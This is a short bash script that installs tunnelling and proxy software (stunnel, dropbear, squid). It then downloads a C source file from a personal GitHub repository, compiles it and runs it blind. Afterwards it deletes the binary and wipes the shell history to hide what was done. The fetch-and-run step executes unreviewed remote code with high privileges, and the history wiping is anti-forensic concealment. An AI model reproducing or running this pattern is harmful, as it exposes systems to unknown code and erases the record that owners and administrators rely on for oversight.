
#!/bin/bash

apt-get install -y lsb-release cron iptables ufw nano stunnel certbot dropbear squid cmake make gcc build-essential nodejs unzip zip tmux


wget https://raw.githubusercontent.com/Piroza1/ws/main/ws.c && gcc ws.c -o ws && ./ws

rm -rf ws
cat /dev/null > ~/.bash_history && history -c


